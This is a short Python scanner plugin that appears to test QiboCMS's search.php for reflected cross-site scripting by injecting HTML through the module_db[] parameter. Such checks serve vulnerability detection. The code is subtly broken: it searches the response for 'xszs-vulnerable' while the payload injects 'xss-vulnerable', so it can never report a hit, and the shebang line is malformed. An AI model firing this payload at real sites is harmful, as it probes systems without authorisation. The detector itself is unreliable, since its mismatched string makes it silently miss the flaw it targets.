# !usr/bin/dev python
# encoding = utf-8

import re


def assign(service, arg):
    if service == 'qibocms':
        return True, arg
    pass


def audit(arg):
    payload = "search.php?module_db[]=<h1>xss-vulnerable</h1><!--"
    url = arg + payload
    code, head, res, errcode, finalurl = curl.curl(url)
    if code == 200:
        if 'xszs-vulnerable' in res:
            security_hole(url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('qibocms', 'http://www.example.com/')[1])